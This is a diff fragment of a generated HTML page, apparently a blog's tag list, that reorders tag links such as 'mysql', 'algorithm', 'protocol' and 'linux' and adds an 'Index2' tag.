@@ -1112,7 +1092,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">mysql</a>
+                <a href="javascript:void(0)" class="js-tag color5">algorithm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Index2</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1128,6 +1112,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mysql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
@@ -1140,15 +1128,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">algorithm</a>
+                <a href="javascript:void(0)" class="js-tag color4">protocol</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">base</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">protocol</a>
               </li>
              
               <li class="article-tag-list-item">
